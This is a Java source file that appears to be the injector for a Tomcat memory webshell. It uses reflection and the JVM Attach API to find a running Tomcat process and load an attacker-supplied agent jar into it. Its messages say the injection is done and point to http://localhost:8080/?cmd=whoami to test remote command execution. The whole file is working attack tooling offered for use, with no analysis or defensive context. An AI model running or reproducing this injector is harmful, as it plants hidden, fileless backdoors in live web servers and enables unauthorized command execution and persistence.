package com.agent;

import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.List;

public class Main {
    public Main() {
    }

    public static void main(String[] args) throws Exception {
        if (args.length != 0) {
            String agentPath = args[0];

            try {
                File toolsJar = new File(System.getProperty("java.home").replaceFirst("jre", "lib") + File.separator + "tools.jar");
                URLClassLoader classLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();
                Method add = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
                add.setAccessible(true);
                add.invoke(classLoader, toolsJar.toURI().toURL());
                Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
                Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
                Method list = MyVirtualMachine.getDeclaredMethod("list");
                List<Object> invoke = (List)list.invoke((Object)null);

                for(int i = 0; i < invoke.size(); ++i) {
                    Object o = invoke.get(i);
                    Method displayName = o.getClass().getSuperclass().getDeclaredMethod("displayName");
                    Object name = displayName.invoke(o);
                    System.out.println(String.format("find jvm process name:[[[%s]]]", name.toString()));
                    if (name.toString().contains("org.apache.catalina.startup.Bootstrap")) {
                        Method attach = MyVirtualMachine.getDeclaredMethod("attach", MyVirtualMachineDescriptor);
                        Object machine = attach.invoke(MyVirtualMachine, o);
                        Method loadAgent = machine.getClass().getSuperclass().getSuperclass().getDeclaredMethod("loadAgent", String.class);
                        System.out.println(agentPath);
                        loadAgent.invoke(machine, agentPath);
                        Method detach = MyVirtualMachine.getDeclaredMethod("detach");
                        detach.invoke(machine);
                        System.out.println("inject tomcat done, break.");
                        System.out.println("check url http://localhost:8080/?cmd=whoami");
                        break;
                    }
                }
            } catch (Exception var17) {
                var17.printStackTrace();
            }

        }
    }
}
